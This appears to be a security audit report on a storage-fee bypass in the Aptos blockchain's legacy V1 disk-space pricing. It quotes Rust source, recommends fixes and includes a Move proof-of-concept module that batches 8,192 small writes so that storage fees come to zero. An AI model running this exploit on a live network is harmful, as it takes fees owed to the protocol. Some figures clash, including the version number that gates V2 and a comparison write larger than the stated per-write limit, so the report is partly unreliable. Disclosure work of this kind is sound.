# Audit Report

## Title
Free Write Quota Bypass in DiskSpacePricing V1 Allows Massive Storage Fee Discounts Through Write Operation Batching

## Summary
The `discounted_write_op_size_for_v1()` function applies a 1KB free write quota per write operation rather than per transaction, allowing attackers to batch many small writes to maximize quota usage and obtain near-zero storage fees for large amounts of state modifications. [1](#0-0) 

## Finding Description
The vulnerability exists in the legacy DiskSpacePricing V1 implementation. When calculating storage fees for write operations, the system subtracts a free quota of 1,024 bytes from each write operation's size before applying the per-byte storage fee. [2](#0-1) 

The issue manifests in two ways:

**For Modifications:** The `charge_refund_write_op_v1()` function charges only the bytes fee (no slot fee), calculated as `discounted_size × legacy_storage_fee_per_excess_state_byte`. [3](#0-2) 

**Attack Scenario:**
1. Attacker creates 8,192 small TableItem state slots (one-time setup cost)
2. In subsequent transactions, attacker modifies all 8,192 slots with writes of exactly 1,024 bytes each (33-byte key + 991-byte value)
3. Each write's discounted size = max(1,024 - 1,024, 0) = 0 bytes
4. Storage fee per write = 0 × 50 = 0 OCTAs
5. **Total cost for 8MB of modifications: 0 OCTAs**

**Legitimate Comparison:**
- Single 8MB modification: (8,388,608 - 1,024) × 50 = 419,337,920 OCTAs (~4.19 APT)
- **Attacker saves 100% of storage fees**

The system enforces limits that still permit this exploit: [4](#0-3) [5](#0-4) 

The attacker can perform up to 8,192 write operations totaling up to 10MB per transaction, with each operation receiving the full 1KB free quota.

## Impact Explanation
This is a **Medium severity** vulnerability per Aptos bug bounty criteria:

1. **Economic Loss**: Protocol loses substantial storage fee revenue (~4+ APT per 8MB transaction)
2. **State Bloat**: Incentivizes creating many small state slots instead of fewer large slots, increasing Jellyfish Merkle Tree depth and query costs
3. **Unfair Economics**: Creates two-tier pricing where sophisticated users pay drastically less
4. **Resource Limits Violation**: Breaks the invariant that "All operations must respect gas, storage, and computational limits" - storage fees should reflect actual costs

**Scope Limitation**: This vulnerability only affects networks using DiskSpacePricing::V1, which is active when gas_feature_version < 13 OR when the REFUNDABLE_BYTES feature flag is disabled: [6](#0-5) 

DiskSpacePricing V2 (introduced in gas feature version 14) fixes this issue by removing the per-slot free quota: [7](#0-6) 

## Likelihood Explanation
**Medium Likelihood** for affected networks:

**Requirements:**
- Network must be using DiskSpacePricing::V1 (gas_feature_version < 13 or REFUNDABLE_BYTES disabled)
- Attacker must create many state slots initially (requires capital for setup)
- Attack is most profitable for frequent, large state modifications

**Affected Networks:**
- Test networks or private deployments on older gas versions
- Networks with REFUNDABLE_BYTES feature flag disabled
- Most production networks (mainnet at gas version 45+) use V2 and are NOT vulnerable

**Complexity:** Low - straightforward to implement once slots are created

## Recommendation
The issue has already been addressed in DiskSpacePricing::V2. Networks should:

1. **Immediate**: Ensure gas_feature_version >= 13 and enable REFUNDABLE_BYTES feature flag to activate V2 pricing
2. **Long-term**: Consider deprecating V1 code path entirely to reduce attack surface
3. **Alternative V1 Fix** (if V1 must remain): Apply free quota per transaction, not per operation:

```rust
// Apply quota once per transaction in epilogue, not per write operation
fn discounted_write_op_size_for_v1(
    params: &TransactionGasParameters,
    key: &StateKey,
    value_size: u64,
) -> NumBytes {
    // Remove per-operation discount - quota should be transaction-level
    NumBytes::new(key.size() as u64) + NumBytes::new(value_size)
}
```

## Proof of Concept

```move
module attacker::storage_exploit {
    use std::vector;
    use aptos_std::table::{Self, Table};
    use std::signer;

    struct ExploitState has key {
        // 8,192 small tables, each will be modified with ~1KB writes
        tables: vector<Table<u8, vector<u8>>>,
    }

    // Setup: Create 8,192 small state slots
    public entry fun setup(account: &signer) {
        let tables = vector::empty<Table<u8, vector<u8>>>();
        let i = 0;
        while (i < 8192) {
            let t = table::new<u8, vector<u8>>();
            // Initial small write to create the slot
            table::add(&mut t, 0, vector::empty<u8>());
            vector::push_back(&mut tables, t);
            i = i + 1;
        };
        move_to(account, ExploitState { tables });
    }

    // Exploit: Modify all 8,192 slots with 991-byte writes
    // Each write = 33 bytes (TableHandle + key) + 991 bytes (value) = 1,024 bytes
    // Discounted size per write = 1,024 - 1,024 = 0 bytes
    // Storage fee per write = 0 × 50 = 0 OCTAs
    // Total cost: 0 OCTAs for 8MB of modifications!
    public entry fun exploit(account: &signer) acquires ExploitState {
        let state = borrow_global_mut<ExploitState>(signer::address_of(account));
        let i = 0;
        let data = vector::empty<u8>();
        // Create 991-byte payload
        let j = 0;
        while (j < 991) {
            vector::push_back(&mut data, (j as u8));
            j = j + 1;
        };
        
        // Modify all 8,192 slots
        while (i < 8192) {
            let t = vector::borrow_mut(&mut state.tables, i);
            // This modification pays ZERO storage fees in V1 pricing
            *table::borrow_mut(t, 0) = data;
            i = i + 1;
        };
        // Total modified: 8,192 × 1,024 bytes = 8MB for 0 storage fee
    }
}
```

**Expected Behavior (V1):** Storage fee = 0 OCTAs for 8MB modifications
**Expected Behavior (V2):** Storage fee = ~8MB × 40 (storage_fee_per_state_byte) = 335,544,320 OCTAs

## Notes
This vulnerability only affects networks using the legacy DiskSpacePricing V1. Modern networks (gas_feature_version >= 13 with REFUNDABLE_BYTES enabled) use V2 which correctly charges for all bytes without per-operation quotas. The V1 code path remains in the codebase for backward compatibility but should be considered deprecated and potentially vulnerable on older network configurations.

### Citations

**File:** aptos-move/aptos-vm-types/src/storage/space_pricing.rs (L37-43)
```rust
    pub fn new(gas_feature_version: u64, features: &Features) -> Self {
        if gas_feature_version >= 13 && features.is_refundable_bytes_enabled() {
            Self::V2
        } else {
            Self::V1
        }
    }
```

**File:** aptos-move/aptos-vm-types/src/storage/space_pricing.rs (L107-115)
```rust
    fn discounted_write_op_size_for_v1(
        params: &TransactionGasParameters,
        key: &StateKey,
        value_size: u64,
    ) -> NumBytes {
        let size = NumBytes::new(key.size() as u64) + NumBytes::new(value_size);
        size.checked_sub(params.legacy_free_write_bytes_quota)
            .unwrap_or(NumBytes::zero())
    }
```

**File:** aptos-move/aptos-vm-types/src/storage/space_pricing.rs (L138-146)
```rust
            Modification { write_len } => {
                let bytes_fee = Self::discounted_write_op_size_for_v1(params, op.key, write_len)
                    * params.legacy_storage_fee_per_excess_state_byte;

                ChargeAndRefund {
                    charge: bytes_fee,
                    refund: 0.into(),
                }
            },
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L144-147)
```rust
            legacy_free_write_bytes_quota: NumBytes,
            { 5.. => "free_write_bytes_quota" },
            1024, // 1KB free per state write
        ],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L174-177)
```rust
            max_write_ops_per_transaction: NumSlots,
            { 11.. => "max_write_ops_per_transaction" },
            8192,
        ],
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L95-113)
```rust
        if self.max_write_ops_per_transaction != 0
            && change_set.num_write_ops() as u64 > self.max_write_ops_per_transaction
        {
            return storage_write_limit_reached(Some("Too many write ops."));
        }

        let mut write_set_size = 0;
        for (key, op_size) in change_set.write_set_size_iter() {
            if let Some(len) = op_size.write_len() {
                let write_op_size = len + (key.size() as u64);
                if write_op_size > self.max_bytes_per_write_op {
                    return storage_write_limit_reached(None);
                }
                write_set_size += write_op_size;
            }
            if write_set_size > self.max_bytes_all_write_ops_per_transaction {
                return storage_write_limit_reached(None);
            }
        }
```

**File:** aptos-move/aptos-gas-schedule/src/ver.rs (L34-35)
```rust
///   - Gas for type creation
///   - Storage Fee: Make state bytes refundable and remove the per slot free quota, gated by flag REFUNDABLE_BYTES
```
